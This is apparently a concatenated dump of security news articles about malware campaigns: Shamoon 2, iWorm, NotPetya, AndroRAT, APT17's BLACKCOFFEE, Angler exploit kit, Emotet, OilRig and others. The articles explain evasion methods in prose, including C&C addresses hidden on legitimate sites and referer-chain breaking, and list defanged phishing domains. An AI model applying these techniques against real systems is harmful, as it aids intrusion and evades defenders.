Apple's Safari browser are served with digitally-signed malware disguised as a PDF file.   \"By default, on OS X 10.9.1 (the latest update to Mavericks, Apple's most recent operating system version), Safari directly downloads the file, showing you an empty Safari window with the icon of the downloaded file in the Dock at the bottom of the screen,\" explained Paul Ducklin at Sophos.   But there is no PDF file; instead Safari has automatically unzipped the download, producing an Application bundle that has been given a PDF icon.   \"OS X does try to advise you that you aren't opening a document, although you can argue that the warning would be more compelling if it explicitly said that you were about to \"run a software program\", rather than merely to \"open\" the file,\" Ducklin noted.   \"If you do click the [Open] button, nothing seems to happen: you end up back at the desktop with your email software open and an empty Safari window in front of it,\" he added. \"But a trip back to the Terminal shows that what looked like a PDF file is now running in the background as a process named foung.\" " }

Shamoon, aka Disttrack, is a disk-wiping malware that became widely known in 2012, when it damaged 35,000 computers belonging to Saudi Arabian petroleum and natural gas company Saudi Aramco. A newer version of the threat, dubbed Shamoon 2, was recently used to target various organizations in the Persian Gulf, including Saudi Arabia’s General Authority of Civil Aviation (GACA), which has downplayed the impact of the attack. Palo Alto Networks has come across two variants of Shamoon 2. The first variant, detailed shortly after the new attacks came to light, was configured to automatically start wiping infected systems in the evening of November 17, 2016, just as the work week ended in Saudi Arabia. The second variant discovered by the security firm had been configured to start wiping infected systems at 1:30 AM (Saudi Arabia time) on November 29, when the majority of the targeted organization’s employees were likely at home. The payload delivered in this second wave was similar to the first one, but experts did find some differences. Same as in the first attacks, Shamoon spread throughout the local network using legitimate domain account credentials, including ones belonging to users and administrators. Since many of these passwords were complex, researchers believe the threat actor may have obtained the information as a result of a previous attack. Palo Alto Networks also highlighted that the second Shamoon 2 variant included credentials for virtualization products from Huawei, specifically virtual desktop infrastructure (VDI) products such as FusionCloud.  These credentials can be found in the vendor’s official documentation, which suggests that the attackers either knew that the organization had been using these credentials based on information collected in a previous attack, or they were simply hoping that the defaults had not been changed. “VDI solutions can provide some protection against a destructive malware like Disttrack through the ability to load snapshots of wiped systems. Also, since FusionCloud systems run a Linux operating system, which would not be susceptible to wiping by the Windows-only Disttrack malware, this could be seen as a reasonable countermeasure against attacks like Shamoon,” Palo Alto Networks’ Robert Falcone wrote in a blog post. “However, if the attacker was able to log into the VDI management interfaces using the account credentials they could manually carry out destructive activities against the VDI deployment, as well as any snapshot,” Falcone added.

According to researchers at security company Dr. Web, the iWorm malware had infected more than 18,500 OS X machines as of Sept. 29. Many of those computers were located in the United States and Canada.   In response, Apple updated its XProtect anti-malware system to detect variants of the worm, according to MacRumors.com.   Mac security site 'The Safe Mac' reported that the malware infects users via pirated software.   \"The moral of the story? Never engage in software piracy,\" blogged The Safe Mac's Thomas Reed. \"This single piece of malware is FAR from the only thing you can get infected with while installing stolen software. Torrents and sites like PirateBay should be avoided at all costs. If you cannot afford to pay for a piece of software or a movie or something similar, do without. Downloading such things for free often come with LOTS of strings attached.\"   The malware can collect information on infected systems as well as download files, execute system instructions and take other actions. According to Dr. Web, the worm leverages Reddit to get a list of command and control servers.   \"The reddit.com search returns a web page containing a list of botnet C&C servers and ports published by criminals in comments to the post minecraftserverlists under the account vtnhiaovyd,\" according to Dr. Web. \"The bot picks a random server from the first 29 addresses on the list and sends queries to each of them. Search requests to acquire the list are sent to reddit.com in five-minute intervals.\"   \"While establishing a connection to the server whose address is picked from the list using a special routine, the backdoor attempts to determine whether the server address is on the exceptions list and engages in a data exchange with the server to employ special routines for authenticating the remote host,\" the Dr. Web post continued. \"If successful, the backdoor sends the server information about the open port on the infected machine and its unique ID and awaits directives.\"   Technical information about the malware can be found here.

British Foreign Office Minister for Cyber Security Lord Tariq Ahmad said the June 2017 NotPetya attack was launched by the Russian military and it “showed a continued disregard for Ukrainian sovereignty.” “The Kremlin has positioned Russia in direct opposition to the West yet it doesn’t have to be that way. We call upon Russia to be the responsible member of the international community it claims to be rather then secretly trying to undermine it,” the official stated. “The United Kingdom is identifying, pursuing and responding to malicious cyber activity regardless of where it originates, imposing costs on those who would seek to do us harm. We are committed to strengthening coordinated international efforts to uphold a free, open, peaceful and secure cyberspace,” he added. The U.K. believes that while the NotPetya attack masqueraded as a criminal campaign, its true purpose was to cause disruption. The country’s National Cyber Security Center (NCSC) assessed that the Russian military was “almost certainly” responsible for the attack, which is the highest level of assessment. The U.K. was also the first to officially accuse North Korea of launching the WannaCry attack. The United States, Canada, Japan, Australia and New Zealand followed suit several weeks later. Last month, Britain's Defence Secretary Gavin Williamson accused Russia of spying on its critical infrastructure as part of a plan to create “total chaos” in the country. While the U.S. has not made an official statement on the matter, confidential documents obtained by The Washington Post last month showed that the CIA had also concluded with “high confidence” that the Russian military was behind the NotPetya attack. Cybersecurity firms and Ukraine, the country hit the hardest by NotPetya, linked the malware to other threats previously attributed to Russia. The NotPetya malware outbreak affected tens of thousands of systems in more than 65 countries. Researchers initially believed NotPetya (also known as PetrWrap, exPetr, GoldenEye and Diskcoder.C) was a piece of ransomware, but a closer analysis revealed that it was actually a destructive wiper.

The updated malware version targets CVE-2015-1805, a publicly disclosed vulnerability that can be abused to achieve privilege escalation on older Android devices. By injecting root exploits, the threat can perform silent installation, shell command execution, WiFi password collection, and screen capture, security researchers have discovered. First observed in 2012, AndroRAT was initially a university project, designed as an open-source client/server application to offer remote control of a device. It didn’t take long for cybercriminals to find the tool appealing and start using it in attacks. The same as other Remote Access Tools (RATs), the malware gains root access in order to take control over the target system. The newly observed version of the tool masquerades as a utility app called TrashCleaner, which the researchers believe is delivered from a malicious URL. When first executed, TrashCleaner prompts the user to install a Chinese-labeled calculator app, hides its icon from the device’s UI, and activates the RAT in the background. “The configurable RAT service is controlled by a remote server, which could mean that commands may be issued to trigger different actions. The variant activates the embedded root exploit when executing privileged actions,” Trend Micro notes. The malware can perform a broad range of actions previously observed in the original AndroRAT, including audio recording, photo taking, and system information theft (phone model, number, IMEI, etc.). It also steals WiFi names, call logs, mobile network cell location, GPS location, contacts, files on the device, list of running apps, and SMS messages, while keeping an eye on all incoming and outgoing SMS. The threat is also capable of obtaining mobile network information, storage capacity, root status, list of installed applications, web browsing history from pre-installed browsers, and calendar events. Additionally, it can record calls, upload files to the device, capture photos using the front camera, delete and send forged SMS messages, take screenshots, execute shell commands, steal WiFi passwords, and silently enable accessibility services for a keylogger. While the targeted vulnerability (CVE-2015-1805) was patched in early 2016, devices that are no longer updated regularly continue to be exposed to this new AndroRAT variant. To avoid being targeted by the threat, users should avoid downloading and installing applications from third-party app stores. Installing the latest security updates and keeping all applications on the device updated at all times should also reduce the risk of being affected, the security researchers point out. " }

German media has identified the 29-year-old man as “Peter Parker” and “Spiderman,” online monikers linked to domains used to coordinate some attacks powered by the notorious Mirai malware. He was also identified by Handelsblatt as Daniel K. A blog post published earlier this month by security blogger Brian Krebs revealed that the suspect is a British man named Daniel Kaye and the hacker known online as “BestBuy.” He has also been tied to the nickname “Popopret,” but it’s unclear if it’s the same person or a partner of BestBuy. Krebs found links between Kaye, a massive Mirai botnet that enslaved a large number of Internet of Things (IoT) devices, and a piece of malware named GovRAT. Reports of BestBuy’s apprehension surfaced in February when German police announced that a man suspected of carrying out the November 2016 attack on Deutsche Telekom had been arrested by the U.K. National Crime Agency (NCA) at a London airport based on a warrant issued by authorities in Germany. According to German media reports, the 29-year-old pleaded guilty on Friday in the Regional Court of Cologne, claiming that he regretted his actions. He said his main motive was money – he was about to marry his fiance and he wanted a good start to married life. It’s worth mentioning that the social media profiles for Daniel Kaye uncovered by Krebs also showed that he had been engaged to be married. The hacker told the court that Deutsche Telekom was not the main target of his attack. Instead, he used the Mirai malware to hijack routers – including ones belonging to Deutsche Telekom customers – and other types of devices, which he abused to launch distributed denial-of-service (DDoS) attacks. He claimed a telecommunications firm in the West African country of Liberia paid him $10,000 to attack a competitor. At the time of his arrest, German authorities said the suspect faced between 6 months and 10 years in prison. He may be sentenced on July 28. " }

Industrial cybersecurity firm Radiflow reported last week that it had identified a piece of malware designed to mine Monero on a human-machine interface (HMI) system at a wastewater facility in Europe. The company warned that the resource consumption associated with this type of malware can severely disrupt plant monitoring tools and the affected organization’s response times. Cryptocurrency mining malware has become increasingly widespread and it has recently been found even on numerous government websites in the United States, the United Kingdom and Australia. This type of malware is also fairly common on industrial systems, according to several cybersecurity firms contacted by SecurityWeek. A study conducted last year by Dragos showed that roughly 3,000 unique industrial sites had been hit by traditional, non-targeted malware. The company discovered approximately 6,000 malware infections, including instances of cryptojacking, said Robert M. Lee, CEO and founder of Dragos. Kaspersky Lab ICS-CERT told SecurityWeek that roughly 3.3 percent of the industrial control systems (ICS) monitored by the company between February 2017 and February 2018 were targeted with cryptocurrency miners, with an increasing trend observed since September 2017.  “Industrial infrastructure is an appealing target for mining attacks due to high power, meaning criminals can earn more in less time. As usually the case with miners, users might notice slowdown of programs and systems performance that inevitably affects the user experience in general,” Kaspersky Lab ICS-CERT said. “In terms of ICS, a spike in CPU load, as a result of miners’ infection, leads to an increase in response time of monitoring tools for SCADA/HIM servers. It’s important to note that most of the ICS are real-time systems designed for process control, where response time is the critical system indicator.” Learn More at SecurityWeek's ICS Cyber Security Conference Darktrace, a security firm known for its AI-based defense technology, said it had identified more than 20 cryptocurrency miner attacks over the past six months among its customers in the energy and utilities sectors. Overall, Darktrace said it had identified more than 400 crypto-mining related incidents across 5,000 customer deployments in more than 30 industries. There has been a steady increase in the number of detections, with roughly 100 mining scripts and cryptocurrency malware incidents detected in January. CyberX used the Shodan search engine to locate a European wastewater facility infected with cryptocurrency mining malware. Just like in the incident described by Radiflow, the threat had been found on an HMI device running CIMPLICITY software from GE Digital. The industrial cybersecurity firm managed to grab a screenshot of the infected HMI.  While the infection vector is not known, CyberX VP of Research David Atch pointed out that older versions of the CIMPLICITY software are affected by CVE-2014-0751, a path traversal vulnerability that can be exploited for arbitrary code execution. This flaw was exploited a few years ago by Russia-linked hackers to deliver the BlackEnergy malware. “Although it's widely believed that Black Energy was developed by a state-sponsored hacking group (most likely Sandworm aka Telebots), the vulnerability is relatively easy to exploit and therefore it's easy to imagine that non-state actors such as cybercriminal organizations now have access to tools that can exploit the same vulnerability,” Atch explained.

Researchers at FireEye Threat Intelligence and the Microsoft Threat Intelligence Center have prepared a brief report on the advanced persistent threat (APT) actor’s C&C obfuscation techniques. Experts have determined that the attackers haven’t actually compromised Microsoft’s website. Instead, they are using the portal’s legitimate functionality to host encoded strings that hide C&C IP addresses. APT17 is a Chinese threat group that has been targeting United States government organizations, the military, law firms, defense contractors, IT firms, mining companies, and NGOs. One of the tools leveraged by the group is BLACKCOFFEE, a backdoor that can be used to upload and download files, create a reverse shell on the infected system, enumerate files and processes, manipulate files, and terminate processes. The malware, which has been used by APT17 since at least 2013, now gets the IP address of the C&C server it’s supposed to communicate with from an encoded string embedded on the TechNet portal. The new version of BLACKCOFFEE contains URLs that point to TechNet forum threads or biography sections in profiles created by the attacker. The encoded string that hides the IP address in plain sight is found in profiles and posts between the “@MICROSOFT” and “CORPORATION” tags. In one example mentioned in the report from FireEye and Microsoft, the encoded IP address was published by the attackers in a forum post that appeared to contain useful information for solving a user’s problem. Once the IP for the C&C is obtained, the malware starts communicating with the server. BLACKCOFFEE uses the C&C server to receive commands and to send information stolen from the infected device back to the malicious actors. “If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines,” the companies explained in the report. Experts have pointed out that the use of a legitimate service, dubbed by some a “dead drop resolver,” and the embedding of an encoded IP address benefits the attackers because it delays detection, and can prevent the discovery of the C&C server’s IP address. FireEye believes other threat groups are already using, or will use, variations of this technique in their operations. “After discovering the BLACKCOFFEE activity, the FireEye-Microsoft team encoded a sinkhole IP address into the profile pages and forum threads and locked the accounts to prevent the threat actors from making any changes,” the report noted. “This collaborative approach allowed the team to observe the malware and its victims. With this information, Microsoft and FireEye can work with the anti-virus community to generate signatures to identify and clean systems affected by the malware and alert other forum and message board managers to be on the lookout for this technique.” " }

The Edge flaws tracked as CVE-2016-7200 and CVE-2016-7201, which Microsoft patched with one of its November 2016 security bulletins (MS16-129), have been described as memory corruptions caused by how the Chakra JavaScript scripting engine handles objects. Microsoft has warned that the security holes can be exploited by a remote attacker to execute arbitrary code in the context of the current user by getting the victim to access a specially crafted website. On January 4, researchers at Austin, TX.-based security R&D startup Theori announced the availability of a PoC exploit for CVE-2016-7200 and CVE-2016-7201. Two days later, the French security researcher known as Kafeine reported seeing the exploits being used by the Sundown exploit kit. The expert said on Friday that the exploits would likely be integrated into other kits within a matter of hours or days. However, Kafeine told SecurityWeek that, as of Monday morning, he had not spotted the exploits in other EKs. In the recent attacks observed by Kafeine, Sundown had been used to deliver ZLoader. Over the past weeks, the researcher has also spotted Sundown delivering payloads such as Zeus Panda, Dreambot, Chthonic, Andromeda, Neutrino Bot, Betabot, Smokebot, Remcos, Kronos and a cryptocurrency miner. This is not the first time cybercriminals have abused a PoC exploit made available by Theori. The same thing happened last summer, when the developers of the Neutrino exploit kit adapted a PoC for CVE-2016-0189 that had been created by the company. Kafeine has pointed out that the EK ecosystem has been “struggling to stay in shape” after it lost Angler, which he called its “innovation locomotive.” The expert said nearly six months have passed without any new exploits being added to EKs. Sundown attracted the attention of the community in August 2015, when it was the first to integrate an exploit for an Internet Explorer vulnerability. Following the disappearance of bigger players such as Angler, Nuclear, Neutrino and Magnitude, it has become one of the top exploit kits and its authors continue to improve it. Trend Micro researchers recently noticed that Sundown, which had typically not made an effort to hide its exploits, started using steganography to disguise malicious code in image files. " }

Last week, IntelCrawler identified a 17-year-old Russian who also goes by the hacker handle \"ree4\" as the creator of malware known as Kaptoxa or BlackPOS. The malware was used to steal payment card information from point-of-sale (POS) terminals. After naming the 17-year-old, the security firm's findings were challenged by security blogger Brian Krebs, who accused the firm of identifying the wrong person.    On Monday, Intelcrawler updated their research with the name of a second individual they say is the real author of the malware and who also used the nickname ree4 in postings in the cyber-underground. According to the company, both suspects worked closely with each other, with one serving as technical support alongside other individuals.   \"[The creator] is still visible for us, but the real bad actors responsible for the past attacks on retailers such as Target and Neiman Marcus were just his customers,\" Dan Clements, president at IntelCrawler, said in a statement on the blog.   Neither is being named by SecurityWeek because they do not appear to have been charged with a crime as of yet. However, Russian news source Lifenews.ru reported that one of the individuals identified by IntelCrawler said BlackPOS said that while he understood the program could be used illegally, his intent was only his interest was only in writing and selling it, and that it could be used to test security.   Meanwhile, the other individual named by IntelCrawler denied any connection to the attack in a separate interview.     According to IntelCrawler, the first infected POS systems targeted by the malware were in Canada, Australia and the United States. Ree4 has sold more than 40 builds of BlackPOS to cybercriminals from Eastern Europe and other countries. As payment for the malware, customers could pay either $2,000 or 50 percent of what they make from the sale of stolen credit cards.   The attack on Target netted payment card and personal information of tens of millions of customers. The malware is also believed to have been used in the recent attack on Neiman Marcus.    \"Most of the victims are department stores,\" Andrew Komarov, IntelCrawler CEO, said in the company's post. \"More BlackPOS infections, as well as new breaches can appear very soon, retailers and security community should be prepared for them.\" " }

The threat, detected by the company as \"Mac.BackDoor.iWorm,\" has been developed in C++ and Lua, and enables cybercriminals to execute a wide range of commands on infected machines. The backdoor can collect information on the infected system, download files, execute system instructions, and carry out other commands that are typical for botnets. What is interesting about Mac.BackDoor.iWorm is that it uses the social link-sharing site Reddit to get a list of command and control (C&C) servers. \"[In] order to acquire a control server address list, the bot uses the search service at reddit.com, and—as a search query—specifies hexadecimal values of the first 8 bytes of the MD5 hash of the current date. The reddit.com search returns a web page containing a list of botnet C&C servers and ports published by criminals in comments to the post minecraftserverlists under the account vtnhiaovyd,\" Dr. Web said in a blog post. \"The bot picks a random server from the first 29 addresses on the list and sends queries to each of them. Search requests to acquire the list are sent to reddit.com in five-minute intervals.\" As security expert Graham Cluley explains, Reddit is not to be blamed for the fact that the malware is abusing its platform. \"[Reddit has] done nothing wrong as such, and even if they shut down the accounts that are communicating with the botnet there would be nothing to stop the hackers behind the campaign creating new accounts or using an alternative service (Twitter, perhaps?) to communicate with the compromised computers,\" Cluley said. Dr. Web has also pointed out that the threat uses encryption in many of its routines. As of September 29, the company had identified a total of 18,519 infected devices, over a quarter of them located in the United States. Infections have also been spotted in Canada, the United Kingdom, Spain, France, the Netherlands, Brazil, Mexico, Australia, Sweden and Russia. It's uncertain at this point how the malware is being distributed. Earlier this week, researchers at Lacoon Mobile Security reported finding an iOS Trojan which they suspect could be used by the Chinese government against people taking part in the pro-democracy protests in Hong Kong. The malware, dubbed Xsser, is capable of stealing all sorts of sensitive information from infected iOS devices. " }

Called “Traps”, the new endpoint security solution is built on technology gained from Palo Alto’s $200 Million acquisition of Tel-Aviv, Israel-based Cyvera in March 2014.  Traps (PDF) was designed to proactively block all attacks targeting endpoints, including unknown malware and zero-day exploits. Cyvera previously claimed that its approach has been so powerful that they had successfully stopped every published zero-day attack since they first began deploying their product.  Reactive security models result in a never-ending chase after the thousands of new malware that emerge each day, or expanding number of software vulnerabilities that can be used to exploit an endpoint, Palo Alto Networks explained.   While the solution is appropriate for deployment in enterprise networks, Trips is also very effective in protecting Critical infrastructure organizations that run ICS/SCADA systems.  Because these systems are frequently distributed over large areas and typically rely on legacy equipment, they often cannot maintain a consistent patching routine and are vulnerable to cyber attacks.  “Cyber attacks utilize ICS-SCADA systems architectural features to target data flow in the operational network (PLC\\RTU, MTU, data and application servers, and HMI), as well as on the corporate network,” the security firm explained. “These attacks can perform silent espionage, gathering genuine system information through monitoring and exfiltration techniques, or launch more serious assaults that not only exfiltrate data, but distort it to sabotage your system.” " }
{ "_id" : { "$oid" : "5b27c4576cefc41c844ab302" }, "Category" : "Malware", "Title" : "Angler EK Makes It Difficult to Track Down Malvertising Sources", "Address" : "https://www.securityweek.com/angler-ek-makes-it-difficult-track-down-malvertising-sources", "Date" : "May 11, 2015", "Article" : "The developers of the Angler exploit kit are trying to make it more difficult for researchers and advertising networks to track down the sources of a malvertising campaign. According to Yonathan Klijnsma, an expert who specializes in malware research and reverse engineering, the Angler exploit kit now breaks the referer chain, which plays an important part when it comes to disrupting malvertising operations. When users click on a link to access a webpage, a request is made to that new webpage. The HTTP referer is a header field in the request containing the address of the webpage the user was on before clicking on the link. In malvertising campaigns, cybercriminals inject malicious ads into legitimate advertising networks in an effort to take users to pages hosting exploit kits. These exploit kits are designed to leverage vulnerabilities in various applications (e.g. Flash Player, Java, Silverlight) in order to push malware onto users’ computers. The victims of malvertising attacks are taken from the website hosting the malicious ad to the exploit kit landing page through a series of redirections. This is why referers are highly useful for going through the redirection chain and tracking down the source of the malicious ad. However, Klijnsma discovered that the Angler exploit kit uses some clever tricks to break the referer chain and make it more difficult to track down the source. The expert told SecurityWeek that the new technique is used in most, if not all, current Angler malvertising campaigns. One of the attacks analyzed by the researcher starts with malicious ads served on a website hosting adult content. These types of sites are often targeted in malvertising campaigns. Last week, Malwarebytes reported spotting a campaign involving dozens of popular adult websites. During his research, Klijnsma found that there were no referers on either the exploit kit redirector or the landing page. The expert says the attackers achieve this goal by using a 2-step system which leverages web browser bugs. Ensuring that the redirection page doesn’t have a referer involves adding a new DIV element on the page. “Inside this DIV [the attacker] puts an iframe which does not have a 'src’ attribute meaning it is not loading anything from a remote site. However most browsers see the context/body of the iframe (and normally the page it loads based on the 'src’ attribute) as a separate page with its own context; this is pretty much how the Angler referer-less request(s) trick works,” Klijnsma explained in a blog post. “In the next step they generate a form with a hidden input. This form is put in the body of the iframe context after which they submit the form. When they submit the form they are sending it from within the iframe context which does not have an actual page loaded which causes the request coming from it to not have a referer; quite a nasty trick.” The expert has created a proof-of-concept (PoC) to show how pages can be requested without referers in the latest versions of Internet Explorer, Chrome, and Firefox. As for the lack of referers on the landing page, the researcher says he isn’t 100% certain about how the malicious actors are doing it, but he believes it has something to do with how the browsers process the request. “When a browser performs a POST request [...] the response is (in most cases) some external resource being loaded in the page. In the case of the redirector we see the response is HTML which contains a meta refresh tag which changed the page location to the specified URL. My guess is that the browser follows the refresh but due to a bug doesn’t follow it with a referer,” Klijnsma said. The researcher has developed a PoC for this technique as well, but it only works on Internet Explorer. Web browser vendors have been made aware of the referer issue described by Klijnsma. By breaking the referer chain, malicious actors ensure that it’s more difficult for automated systems and researchers to track the malvertising campaigns. If browser vendors address the issue, more automated reporting will be possible, the expert noted. “Currently tracking these Angler redirects down is really hard, and manual work just based on URL logs,” Klijnsma told SecurityWeek.

According to Proofpoint, the attack leveraged 100,000 consumer gadgets ranging from televisions to home networking routers to at least one refrigerator. The attack occurred between Dec. 23, 2013, and Jan. 6, and typically involved bursts of emails three times a day. Roughly 25 percent came from devices that were not conventional laptops, desktop computers or mobile devices.   \"Most gadgets don't appear to have been infected by remote control software…in the traditional way personal computers are infected,\" explained David Knight, general manager of Proofpoint's Information Security Division. \"Most seem to have simply been left open so existing software running on them can be used by attackers. Specifically, a vast number of the devices are running embedded linux servers -usually busybox, some use mini-httpd, some apache. Some are ARM devices, some are MIPS…others are based on an embedded Realtek chipset – eg. media players. We believe some are game consoles.\"   The common denominator, Knight said, is that many have open telnet, open SSH and a SMTP server, meaning that an actual exploit by the attacker is not necessary.   \"There's less infection or exploit involved by the attacker than simple 'open or default user/pass login [and] configuration', login and set up the existing emailer to send or relay malicious email,\" he said. \"It's like someone installing a webserver and email server on a laptop, hooking it up to the internet, and leaving it on with no password or a default password... someone will come along and start using that webserver and email server.\"   The targets of the emails included individuals and enterprises alike. According to Proofpoint, no more than 10 emails were sent from any single IP address, which made the attack difficult to block based on location. Origin IP addresses in the malicious emails were checked for spoofing and true origin IP addresses were checked for open or default [username and password] FTP, telnet and HTTP access.   \"The results spoke for themselves when the IPs responded with explicit identification, including well-known, often graphically branded… interfaces, file structures, and content such as firmware update files on FTP ports,\" Knight said.   \"The challenge of an open computer running a well-known linux operating system, webserver, and email server is that it can be repurposed to do many things,\" he said. \"We saw it sending spam and malicious email…but the attacker with access to these devices could equally well use the devices for DDOS attacks (flooding websites with traffic, so that they crash), or bitcoin mining, or as repositories for stolen intellectual property or software, or... the list goes on.  It's a free online computer with storage space. Its uses are infinite.\"   John Pescatore, director of emerging trends at SANS Institute, told SecurityWeek that the security realities facing consumer smart devices are not unlike those that existed for WiFi when it first became popular and home access points were often unsecure.   \"The industry got behind first WEP, then WPA, and now it is much more common to find the majority of access points secured and the out of the box instructions emphasizing security,\" Pescatore said. \"The same needs to happen with all those consumer items – raise the out of the box security level just enough to make it take conscious action to open up the easy attacks paths.\" " }

The recent WannaCry and NotPetya incidents have demonstrated how efficient an attack can be if the malware includes a component that allows it to spread from one system to another. Given the success of these operations, other cybercriminals may also be looking to incorporate similar capabilities into their malware. Emotet, also known as Geodo, is related to the Dridex and Feodo (Cridex, Bugat) malware families. Emotet has mainly served as a banking Trojan, helping cybercriminals steal banking credentials and other sensitive information from users in Europe and the United States. In the attacks observed recently by Fidelis, Emotet has been used as a downloader for several other banking Trojans based on the victim’s geographical location. The spreader component seen in attacks over the past month is designed to enumerate network resources in an effort to locate shares to which it can write a file and create a remote service. The service, named “Windows Defender System Service,” writes the malware to the disk and executes it. If a shared resource is password-protected, the malware will try to guess credentials for user and administrator accounts by launching a dictionary attack. Researchers pointed out that the network spreader component they have analyzed is packaged differently compared to the known Emotet modules, which could indicate that the spreader is a component used only by a specific group and not a direct piece of the malware. “With the recent addition of spreading capabilities being added to ransomware it’s not at all surprising to see other malware families start to look into adding similar capabilities. It seems to be a common trend lately for malware developers to add in functionality based on what’s in the news which recently has been filled with all things wormable, which could mean this might be a continued trend for malware in the future,” said Fidelis’ Jason Reaves. Fidelis has published a blog post containing technical details on the spreader component and indicators of compromise (IoC).

OilRig has been around since at least 2015 and its campaigns have been analyzed by several researchers, including from FireEye and Palo Alto Networks. The attackers have targeted organizations in Saudi Arabia, Israel, the United States, Turkey, the United Arab Emirates, Lebanon, Kuwait and Qatar, including government agencies, financial institutions and tech companies. Recent attacks observed by researchers at ClearSky have been aimed at several Israeli organizations, including IT vendors, financial institutions and the country’s national postal service. In some of the attacks seen by ClearSky, the threat actor set up a fake Juniper Networks VPN portal and used compromised email accounts from IT vendors to lure victims to it. It’s unclear if the malicious actor compromised the affected vendors’ entire networks or just the email accounts they used to send out messages containing links to the fake VPN portal. Once taken to the fake Juniper website, victims were instructed to install a VPN client, a legitimate piece of software from Juniper Networks bundled with Helminth, a piece of malware known to be used by OilRig. According to researchers, these files had been signed with a valid code-signing certificate issued by Symantec to a US-based software company called AI Squared. A different Helminth sample found by ClearSky was signed with a different certificate issued to the same company. “This suggest that the attackers had got a hold of an AI Squared signing key, potentially after compromising their network,” researchers said. “Alternatively, the attackers might have got Symantec to issue them a certificate under AI Squared’s name.” In other OilRig attacks, the threat group registered four domain names apparently belonging to Oxford University, including oxford-symposia[.]com, oxford-careers[.]com, oxford[.]in and oxford-employee[.]com. The first domain mimicked an Oxford conference registration website and instructed visitors to install a tool allegedly needed for pre-registration. The tool, also signed with an AI Squared certificate, prompts users to provide various types of personal information and generates what it claims to be a “pre-registration form.” Users are then instructed to send the form to an email address hosted on the attackers’ second domain, oxford-careers[.]com. At one point, this domain was linked to oxford[.]in, which had stored some documents, but researchers could not determine what these files contained as they were unavailable during their analysis. The last fake Oxford domain, oxford-employee[.]com, hosted a job application website and provided users an “official” Oxford CV creator. The fake CV creator is also a tool created by the attackers.  In a blog post published in October, Palo Alto Networks revealed that OilRig had used an IP address mentioned in 2015 by Symantec in a report describing the activities of two Iran-based threat groups, named Cadelle and Chafer, that appeared to be linked. ClearSky has confirmed that the same IP address has been linked to both OilRig and a piece of malware used by Chafer. While attribution is often difficult, evidence found by researchers suggests that OilRig is based in Iran, including the use of the Persian language in the malware samples, and information associated with the command and control (C&C) domains used by the group.

According to the company, Wildfire has been bolstered an improved level of file visibility, including all common file types such as PDFs, Office documents and encrypted applications. In addition, zero-day exploit detection capabilities have been added that rely on behavioral analysis, and the product works to block command-and-control activity using a global database of compromised domains and infrastructure. WildFire detects unknown malware, zero-day exploits, and Advanced Persistent Threats (APTs) by executing them in a cloud-based virtual sandbox environment. The enhancements are accessible via Palo Alto Networks PAN-OS version 6.0. The PAN-OS operating system is the \"heart of the Palo Alto Networks platform, which will be available for all Palo Alto Networks customers with valid support contracts,\" according to the company. Previously in order to use WildFire, organizations needed to be an existing Palo Alto Networks firewall customer. However, that is no longer the case, as WildFire is now sold in a stand-alone capacity, the company told SecurityWeek. \"The Palo Alto Networks security platform with WildFire gives us an extra layer of security we didn't have before -- extra inspection and comfort that we can stay ahead of breaches by not just detecting them, but also by easily blocking them,\" said Phil Cummings, security administrator, Health Information Technology Services-Nova Scotia. \"By having our firewall, URL filtering, threat prevention natively integrated and managed from a single dashboard -- instead of multiple niche products, we have a clearer picture of our threat landscape. Ultimately, the platform gives us what we need to effectively detect, analyze, block, and, more importantly, quickly remediate issues.\" The single dashboard is another of the enhancements, and is meant to offer security administrators a view into the information on malware, malicious behavior, compromised hosts and more so that incident response teams can quickly react to a threat. \"Quickly detecting and eliminating previously unknown threats across all applications is key to protecting an organization from today's advanced threats,\" said Lee Klarich, senior vice president of product management at Palo Alto Networks, adding that the company's approach gives customers the \"closed loop capabilities\" they need to effectively stop sophisticated threats.

In 2011, the FBI deployed a tool called the Binary Analysis Characterization and Storage System (BACSS). The tool provides technical information on malware functionality, which investigators and incident responders can use in their activities. Since BACSS has been a success, the FBI decided to develop Malware Investigator, an unclassified automated malware analysis tool that can be used not only by other law enforcement agencies which might need it for cybercrime investigations, but also by researchers trying to understand the threat landscape, and private sector partners seeking to improve their cyberattack mitigation capabilities. \"Through Malware Investigator, the FBI will lead a collaborative effort with members of the law enforcement community, academia, and the private sector, to protect businesses deemed critical to the nation's infrastructure. Malware Investigator will provide its users a trusted venue in which to investigate, analyze, study, and collaborate about malware threats,\" the FBI said on the Malware Investigator website. The agency believes such tools can be very useful because organizations that handle cyber security incidents must be able to quickly analyze suspicious files and share the results with other members of the community. In March, when the FBI presented the Malware Investigator, Unit Chief Steve Pandelides noted that the tool would also \"provide the FBI a global view of the malware threat.\" At the Virus Bulletin conference, the FBI's Jonathan Burns explained (PDF) that the tool provides users with the information they need to respond to incidents and further investigate, so that they don't have to waste precious time waiting for the malware to be reverse engineered. Malware Investigator is designed to analyze threats based on file hashes, correlation, comparison, virus scanning and sandboxing. In addition to a Web service, the FBI has also developed an API for entities that want to integrate the resource into existing systems, Burns said. For the time being, Malware Investigator is only available to law enforcement via the Law Enforcement Enterprise Portal (LEEP). Private sector organizations will soon be able to access the service via InfraGard, the partnership between the FBI and the private sector. It's not a secret that the FBI is interested in collecting malware from multiple sources. Back in February, the agency announced that it was willing to pay for malware that would be used by the Investigative Analysis Unit (IAU) of the agency's Operational Technology Division. The FBI said at the time that the collection of malware is \"critical to the success of the IAU's mission to obtain global awareness of malware threat.\" " }

NotPetya (also known as Nyetya, PetrWrap, exPetr, GoldenEye, and Diskcoder.C) infected tens of thousands of systems, including ones belonging to major organizations, in more than 65 countries. Many of the victims were located in Ukraine, which is not surprising considering that the main attack vector was the update system of M.E. Doc, an accounting tool developed by Kiev-based tax software firm Intellect Service. The infosec community initially believed NotPetya was a piece of ransomware, similar to WannaCry. However, closer analysis revealed that it was actually a wiper and it was unlikely that victims could recover their files, even if they paid the ransom. TNT Express, whose Ukraine office uses the compromised tax software, was hit hard by the attack, which led to FedEx temporarily suspending trading of its shares on the New York Stock Exchange. It’s worth noting that FedEx was also impacted by the WannaCry attack. In its annual report with the SEC on Form 10-K for fiscal year 2017, FedEx said the attack did not affect any other of its companies. While there is no evidence that any data was stolen by malicious actors from TNT systems, the attack had a significant impact on the company’s operations and communications. A majority of TNT services are available by now, but FedEx informed customers of possible delays in service and invoicing due to the use of manual processes. The company is working on restoring critical systems, including operational, finance, back-office and secondary business systems, but it’s unclear how long the process will take. Furthermore, FedEx believes it’s “reasonably possible” that TNT will not be able to fully restore all affected systems and recover all the critical business data encrypted by NotPetya. “Given the 